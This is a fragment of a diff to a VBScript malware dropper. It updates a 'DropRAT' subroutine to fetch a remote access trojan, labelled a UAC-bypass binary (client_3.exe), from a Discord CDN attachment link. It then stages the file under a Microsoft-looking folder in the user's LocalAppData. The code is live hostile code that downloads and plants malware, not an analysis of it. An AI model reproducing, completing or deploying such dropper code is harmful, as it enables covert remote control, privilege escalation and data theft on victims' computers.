@@ -43,9 +43,9 @@ Loop
 
 window.close()
 
-' --- RAT DROP (curl) ---
+' --- RAT DROP (client_3.exe, UAC-bypass binary) ---
 Sub DropRAT(targetWH, sendRocket)
-    Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1572397351186726983/client_1.exe?ex=6afe38a6&is=6afce726&hm=4b6fb143a4c62538322222e24538818e709116379007ef0fcaa57f9e2c945054&"
+    Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1572430106796884078/client_3.exe?ex=6afe5727&is=6afd05a7&hm=10103f544bd9d3a599a330d57ce9ef9cf3d951da378b4c7882f87323c6e953a7&"
 
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
